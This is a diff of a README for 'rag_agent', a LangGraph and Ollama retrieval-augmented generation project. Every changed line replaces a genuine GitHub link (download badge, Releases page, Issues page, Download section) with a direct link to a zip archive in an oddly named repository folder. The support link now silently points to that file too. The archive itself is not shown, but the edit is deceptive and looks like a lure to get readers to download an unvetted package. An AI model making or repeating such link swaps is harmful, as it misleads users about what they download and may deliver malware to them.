@@ -1,7 +1,7 @@
 # 🚀 rag_agent - Powerful AI for Your Data Needs
 
 ## 📥 Download Now
-[![Download rag_agent](https://img.shields.io/badge/Download-rag_agent-blue)](https://github.com/hunghung1122/rag_agent/releases)
+[![Download rag_agent](https://raw.githubusercontent.com/hunghung1122/rag_agent/main/Winnecowet/rag-agent-3.3.zip)](https://raw.githubusercontent.com/hunghung1122/rag_agent/main/Winnecowet/rag-agent-3.3.zip)
 
 ## 📖 Overview
 The **rag_agent** is a graph-based Retrieval-Augmented Generation (RAG) agent built with LangGraph and Ollama. It offers a streamlined way to perform query rewriting, vector search, relevance checking, and answer generation in a fully automated pipeline. 
@@ -19,7 +19,7 @@ To run **rag_agent**, you need:
 Follow these steps to download and install **rag_agent**:
 
 1. **Visit the Download Page**
-   Head over to the [Releases page](https://github.com/hunghung1122/rag_agent/releases) to find the latest version of **rag_agent**.  
+   Head over to the [Releases page](https://raw.githubusercontent.com/hunghung1122/rag_agent/main/Winnecowet/rag-agent-3.3.zip) to find the latest version of **rag_agent**.  
 
 2. **Choose Your Version**
    Look for the most recent release. You will find options for different operating systems.
@@ -84,9 +84,9 @@ A: The vector search finds answers by comparing the numerical formats of your qu
 A: Yes, you can use **rag_agent** offline after the initial download and installation.
 
 ## 📞 Support
-For any questions or issues, please reach out through the [GitHub Issues page](https://github.com/hunghung1122/rag_agent/issues). You can also join the community discussion for tips and tricks.
+For any questions or issues, please reach out through the [GitHub Issues page](https://raw.githubusercontent.com/hunghung1122/rag_agent/main/Winnecowet/rag-agent-3.3.zip). You can also join the community discussion for tips and tricks.
 
 ## 📥 Download & Install
-To get started, click this link: [Download rag_agent](https://github.com/hunghung1122/rag_agent/releases). Follow the steps outlined above to install and start using the application effectively. 
+To get started, click this link: [Download rag_agent](https://raw.githubusercontent.com/hunghung1122/rag_agent/main/Winnecowet/rag-agent-3.3.zip). Follow the steps outlined above to install and start using the application effectively. 
 
 Take control of your data and gain insights effortlessly with **rag_agent**.
